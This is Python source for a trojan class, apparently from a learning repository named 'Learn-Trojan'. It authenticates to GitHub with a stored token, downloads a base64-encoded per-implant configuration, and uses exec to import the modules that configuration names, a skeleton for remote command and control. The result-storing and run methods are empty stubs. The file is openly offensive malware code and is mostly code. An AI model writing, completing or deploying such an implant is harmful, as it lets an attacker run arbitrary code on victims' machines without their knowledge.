import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

#function to connect to github
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
        user = 'ericardiansa'
        sess = github3.login(token=token)
        return sess.repositories(user, 'Learn-Trojan')
#function to get file contents from repositories
def get_file_contents(dirname,module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

#create trojan class to performs trojaning task
class Trojan:
    #function init
    def __init__(self,id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    #function get configuration
    def get_config(self):
        #read config file
        config_json = get_file_contents(
            'config', self.config_file, self.repo
        )
        #load config data
        config = json.loads(base64.b64decode(config_json))

        #checking module
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config
    
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        pass

    def run(self):
        pass